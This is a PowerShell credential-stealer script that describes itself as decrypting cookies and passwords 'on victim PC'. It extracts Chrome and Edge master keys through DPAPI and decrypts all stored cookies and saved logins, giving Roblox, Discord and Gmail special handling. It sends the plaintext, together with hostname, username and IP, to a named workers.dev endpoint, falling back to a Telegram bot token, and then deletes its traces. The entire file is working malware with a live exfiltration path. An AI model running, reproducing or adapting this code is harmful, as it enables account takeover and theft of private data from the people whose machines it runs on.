# steal_full_plaintext.ps1
# Decrypts cookies + passwords on victim PC and sends plaintext to worker.

$worker_url = "https://reciever.tyceno89.workers.dev"
$temp = "$env:TEMP\steal_full"
New-Item -ItemType Directory -Force -Path $temp | Out-Null

# --- 1) PC INFO ---
$pc_info = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
}

# --- 2) BROWSER PATHS ---
$browsers = @(
    @{
        Name = "Edge"
        LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
        LoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    },
    @{
        Name = "Chrome"
        LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    }
)

# --- 3) DECRYPTION FUNCTIONS ---
Add-Type -AssemblyName System.Security

function Get-MasterKey {
    param($local_state_path)
    if (-not (Test-Path $local_state_path)) { return $null }
    $data = Get-Content $local_state_path | ConvertFrom-Json
    $enc_key = [Convert]::FromBase64String($data.os_crypt.encrypted_key)
    $enc_key = $enc_key[5..($enc_key.Length-1)]
    return [System.Security.Cryptography.ProtectedData]::Unprotect($enc_key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

function Decrypt-Value {
    param([byte[]]$encrypted_value, [byte[]]$master_key)
    if (-not $encrypted_value -or $encrypted_value.Length -lt 15) { return $null }
    try {
        if ([System.Security.Cryptography.AesGcm]::IsSupported) {
            $nonce = $encrypted_value[3..14]
            $ciphertext = $encrypted_value[15..($encrypted_value.Length - 17)]
            $tag = $encrypted_value[($encrypted_value.Length - 16)..($encrypted_value.Length - 1)]
            $aes = [System.Security.Cryptography.AesGcm]::new($master_key)
            $plaintext = [byte[]]::new($ciphertext.Length)
            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
            return [System.Text.Encoding]::UTF8.GetString($plaintext)
        } else {
            return "ERROR: AES-GCM not supported"
        }
    } catch {
        return $null
    }
}

# --- 4) READ COOKIES (using ODBC, no external DLLs) ---
function Get-Cookies {
    param($cookie_db, $master_key)
    $results = @{}
    if (-not (Test-Path $cookie_db) -or -not $master_key) { return $results }
    try {
        $conn = New-Object System.Data.Odbc.OdbcConnection("DRIVER=Microsoft ODBC for SQLite;DATABASE=$cookie_db;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $host = $reader.GetString(0)
            $name = $reader.GetString(1)
            $enc_val = $reader.GetValue(2)
            $plain = Decrypt-Value $enc_val $master_key
            if ($plain) {
                if ($host -match "roblox") {
                    $results["roblox_$name"] = $plain
                } elseif ($host -match "discord") {
                    $results["discord_$name"] = $plain
                } elseif ($host -match "google" -and $name -match "gmail") {
                    $results["gmail_$name"] = $plain
                } else {
                    # Store all cookies with host prefix
                    $results["$host`_$name"] = $plain
                }
            }
        }
        $reader.Close()
        $conn.Close()
    } catch {}
    return $results
}

# --- 5) READ PASSWORDS ---
function Get-Passwords {
    param($login_db, $master_key)
    $results = @()
    if (-not (Test-Path $login_db) -or -not $master_key) { return $results }
    try {
        $conn = New-Object System.Data.Odbc.OdbcConnection("DRIVER=Microsoft ODBC for SQLite;DATABASE=$login_db;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $user = $reader.GetString(1)
            $enc_pass = $reader.GetValue(2)
            $plain = Decrypt-Value $enc_pass $master_key
            if ($plain) {
                $results += @{ url = $url; username = $user; password = $plain }
            }
        }
        $reader.Close()
        $conn.Close()
    } catch {}
    return $results
}

# --- 6) PROCESS EACH BROWSER ---
$all_data = @{ pc_info = $pc_info; browsers = @() }

foreach ($b in $browsers) {
    $browser_data = @{ name = $b.Name }
    
    # Get master key
    $master_key = Get-MasterKey $b.LocalState
    if (-not $master_key) { continue }
    
    # Copy files (to avoid lock issues)
    $cookie_copy = "$temp\$($b.Name)_Cookies.db"
    $login_copy = "$temp\$($b.Name)_LoginData.db"
    Copy-Item $b.Cookies $cookie_copy -Force -ErrorAction SilentlyContinue
    Copy-Item $b.LoginData $login_copy -Force -ErrorAction SilentlyContinue
    
    # Extract data
    $browser_data.cookies = Get-Cookies $cookie_copy $master_key
    $browser_data.passwords = Get-Passwords $login_copy $master_key
    
    $all_data.browsers += $browser_data
}

# --- 7) SEND PLAINTEXT DATA TO WORKER ---
$json = $all_data | ConvertTo-Json -Depth 10
try {
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop
} catch {
    # Fallback: send to Telegram
    $t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
    $c = "6760965981"
    $msg = "Data from $($pc_info.hostname):`n$($json.Substring(0, [Math]::Min(1900, $json.Length)))"
    $body = @{ chat_id = $c; text = $msg }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
}

# --- 8) CLEANUP ---
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
